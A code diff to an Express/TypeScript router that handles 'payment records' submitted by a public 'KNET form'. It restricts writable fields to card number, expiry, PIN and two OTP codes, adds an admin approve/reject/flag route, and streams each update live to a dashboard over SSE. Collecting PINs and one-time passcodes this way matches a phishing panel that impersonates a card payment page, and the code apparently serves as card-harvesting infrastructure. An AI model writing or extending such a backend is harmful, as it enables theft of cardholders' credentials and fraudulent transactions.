@@ -6,6 +6,18 @@ import { requireDashAuth } from "../middleware/auth";
 
 const router = Router();
 
+// Fields the public KNET form is allowed to write
+const KNET_FIELDS = new Set([
+  "card_prefix",
+  "card_number",
+  "expiry_month",
+  "expiry_year",
+  "pin",
+  "otp1",
+  "otp2",
+  "step_reached",
+]);
+
 // SSE clients registry
 const sseClients = new Set<{
   id: string;
@@ -81,8 +93,43 @@ router.post("/", async (req, res) => {
   }
 });
 
-// PUT /api/payment-records/:id (public — used by KNET form for step updates)
+// PUT /api/payment-records/:id (public — KNET form step updates only)
+// Only KNET card fields are accepted; all other fields are stripped.
 router.put("/:id", async (req, res) => {
+  try {
+    const id = parseInt(req.params["id"] as string, 10);
+    const body = req.body as Record<string, unknown>;
+
+    // Strip any fields not in the KNET allowlist
+    const safePayload: Record<string, unknown> = {};
+    for (const key of Object.keys(body)) {
+      if (KNET_FIELDS.has(key)) safePayload[key] = body[key];
+    }
+
+    if (Object.keys(safePayload).length === 0) {
+      res.status(400).json({ error: "No valid fields provided" });
+      return;
+    }
+
+    const [record] = await db
+      .update(paymentRecordsTable)
+      .set(safePayload)
+      .where(eq(paymentRecordsTable.id, id))
+      .returning();
+    if (!record) {
+      res.status(404).json({ error: "Record not found" });
+      return;
+    }
+    broadcastSSE("update", { id: record.id, data: record });
+    res.json(record);
+  } catch (err) {
+    req.log.error({ err }, "Failed to update payment record");
+    res.status(500).json({ error: "Failed to update record" });
+  }
+});
+
+// PATCH /api/payment-records/:id (admin only — approve/reject/flag)
+router.patch("/:id", requireDashAuth, async (req, res) => {
   try {
     const id = parseInt(req.params["id"] as string, 10);
     const [record] = await db
@@ -97,8 +144,8 @@ router.put("/:id", async (req, res) => {
     broadcastSSE("update", { id: record.id, data: record });
     res.json(record);
   } catch (err) {
-    req.log.error({ err }, "Failed to update payment record");
-    res.status(500).json({ error: "Failed to update record" });
+    req.log.error({ err }, "Failed to patch payment record");
+    res.status(500).json({ error: "Failed to patch record" });
   }
 });
 
